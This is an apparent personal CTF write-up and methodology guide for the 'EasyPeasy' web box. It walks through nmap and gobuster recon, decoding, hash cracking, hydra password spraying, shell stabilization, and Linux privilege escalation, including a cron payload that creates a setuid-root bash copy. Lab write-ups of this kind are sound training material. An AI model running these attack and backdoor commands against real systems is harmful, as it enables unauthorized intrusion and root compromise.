    EasyPeasy (Web)

    Goal

    Solve EasyPeasy end‑to‑end and learn a reusable methodology you can apply to most beginner–intermediate web CTFs.
    You’ll see what to do, why it works, and the mental models behind each step.

    TL;DR¶

    • Map the attack surface → nmap + HTTP recon
    • Find lightweight clues → /robots.txt, hidden notes, wordlists
    • Pivot from hints to execution → decode/encode, brute logical steps, avoid rabbit holes
    • Privesc via capabilities/SUID or misconfig (illustrative patterns shown below)

    Folder Layout (Local → Repo)¶

    Your local artifacts (from your machine):

    /home/makar/CTFs/easypeasyctf
├── 10.201.72.248:65524/      # scraped pages or downloaded content
├── binarycodepixabay.jpg     # stego candidate (if any)

├── easypeasyctf_writeup      # your original notes (source of truth)
├── hash.txt                  # hashes found during the run
└── secrettext.txt            # suspicious clues/notes

    Where this page should live in your Git repo:

    ~/kareem-notes-pro/docs/ctf/web/easypeasy-ctf/README.md

    Learning Objectives¶

    1. Enumeration Mindset: Turn vague surfaces into concrete leads systematically.
    2. Signal vs Noise: Recognize actionable clues (hashes, encodings, hidden paths).
    3. Tool→Theory Bridge: Understand the protocol/encoding behind the tool output.
    4. Repeatable Playbook: Export your steps as a reusable checklist/cheatsheet.

    0) Rules & Lab Hygiene¶

    • Stay inside the CTF scope (host/IP provided by the platform).
    • Log everything: timestamps, commands, outputs, and conclusions right next to them.
    • Use a scratchpad → narrative flow (you did this via easypeasyctf_writeup).

    1) Reconnaissance¶

    1.1 Host Discovery & Port Scan¶

    Use a quick top-ports scan to find open services, then a full scan if needed.

    # Quick scan
nmap -Pn -sC -sV -vv -oN easypeasyctf_nmap <TARGET_IP>

# If the target uses a non-default port you already know (e.g., 65524), include it:
nmap -Pn -sC -sV -p 65524 -vv -oN easypeasyctf_nmap_specific <TARGET_IP>

# Optional: full range + UDP (heavier)
nmap -Pn -p- -sV -oN easypeasyctf_nmap_all <TARGET_IP>

    Why these flags? - -sC runs default scripts (safe discovery of common misconfigs). - -sV fingerprints service versions → feeds Google/CVE lookups. - -Pn avoids unreliable ping checks in lab firewall/NAT setups.

    Tip

    Keep one canonical nmap file per box with the best information; keep others for experiments.

    1.2 Web Surface Mapping¶

    If HTTP/HTTPS is open:

    whatweb http://<TARGET_IP>:<PORT>
curl -I http://<TARGET_IP>:<PORT>/

    Then check the usual low-hanging fruit:

    # robots, sitemap, server headers, source comments
curl -s http://<TARGET>:<PORT>/robots.txt
curl -s http://<TARGET>:<PORT>/ | pup 'a attr{href}'
curl -s http://<TARGET>:<PORT>/ | pup 'script,link,meta'

    Why this matters: robots/sitemap and HTML comments often leak keywords, usernames, hidden paths, or encodings that chain later.

    1.3 Wordlists & Content Discovery¶

    gobuster dir -u http://<TARGET>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_common.txt -t 50
# If hints mention 'easy', 'peasy', 'chocolate', try themed custom lists as well.

    Model: Hypothesis-driven brute force. Start with common lists; guide deeper by clues you’ve already found.

    2) From Clues to Credentials (Decoding & Hashing 101)¶

    2.1 Recognize Encodings by Eye¶

    • Base64: Looks like A–Z a–z 0–9 + / with = padding. Try:
    echo 'c2VjcmV0' | base64 -d
    • Hex: pairs of [0-9a-f]. Try:
    echo '74657374' | xxd -r -p
    • URL-encoding: %2f, %3a… Use python -c or urldecode.
    • ROT/N: letters shifted; rot13 or cyberchef.
    • Stego suspects: Images with EXIF oddities or appended data:
    exiftool binarycodepixabay.jpg
strings -n 8 binarycodepixabay.jpg | less
binwalk -eM binarycodepixabay.jpg

    2.2 Hash Identification¶

    Use hashid/hash-identifier:

    hashid -m -j hash.txt

    If it’s a crackable fast hash (MD5/SHA1/NTLM), try rockyou quickly:

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# or
hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt

    3) Exploitation (Turning Findings into Access)¶

    3.1 Common Web Flows¶

    • Leaked creds → /login or basic auth.
    • LFI/RFI → read /etc/passwd or app configs.
    • Upload bypass → webshell (php, aspx) with extension or MIME tricks.
    • Weak cookies/JWT → forge or decode to escalate roles.

    Example: If a hint reveals a password theme (e.g., easy-peasy-<year>), build a small custom list and try:

    # password spraying example with hydra
hydra -l <user> -P easy_peasy_custom.txt http-get://<TARGET>:<PORT>/login

    3.2 Shell Stabilization¶

    Once you land a shell:

    python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm-256color

    4) Privilege Escalation (Linux Patterns)¶

    4.1 SUID / Capabilities¶

    # SUID hunting
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

    If you see unusual SUID binaries (custom scripts, older interpreters), check GTFOBins patterns.

    4.2 Weak Service Files / Cron¶

    systemctl list-timers --all
cat /etc/crontab
ls -l /etc/cron.*/*
    • World-writable scripts run as root? Replace payload safely to get a root shell.
    • Important: Prefer a file-drop + root-owned SUID bash method during CTF; do not use destructive payloads.

    Example payload (explain‑and‑learn):

    # i will run as root
/bin/cp /bin/bash /tmp/bashroot
/bin/chown root:root /tmp/bashroot
/bin/chmod 4755 /tmp/bashroot

    Why it works:
    Setuid bit (4) on a root‑owned binary lets regular users execute it with effective UID 0. Running /tmp/bashroot -p yields a root shell in a contained lab. Remove after use.

    4.3 Path Hijacking / Insecure Scripts¶

    Search for scripts that call /bin/sh or unsanitized $PATH:

    grep -R "sh " /etc/ 2>/dev/null | head
strings /usr/local/bin/* | grep -E '(/bin/sh|sudo|scp|tar)'

    5) Post-Exploitation Notes¶

    • Read flags, capture exact paths.
    • Enumerate interesting files: /var/www/, /home/*/.ssh/, /opt/ apps.
    • Screenshot or copy small configs that explain the root cause (education > just the flag).

    6) Cheat Sheet (Reusable)¶

    Enumeration

    nmap -Pn -sC -sV -oN scan.txt <ip>
whatweb http://<ip>:<port>
gobuster dir -u http://<ip>:<port>/ -w /usr/share/wordlists/dirb/common.txt

    Decoding

    base64 -d, xxd -r -p, rot13, urldecode
exiftool/binwalk/strings (for images/binaries)

    Privesc

    find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; systemctl list-timers --all

    Appendix A — Quick Theory Nuggets¶

    A.1 Setuid in One Minute¶

    • Files have mode bits: read(4), write(2), execute(1).
    • The special setuid bit (4xxx) on an executable sets effective UID to owner on exec.
    • With root:root owner, chmod 4755 bash → bash -p runs with eUID=0.

    A.2 Why -sC -sV?¶

    • Default scripts quickly surface misconfigs without being intrusive.
    • Version detection lets you map to known vulns (CVE search) or framework‑specific tricks.
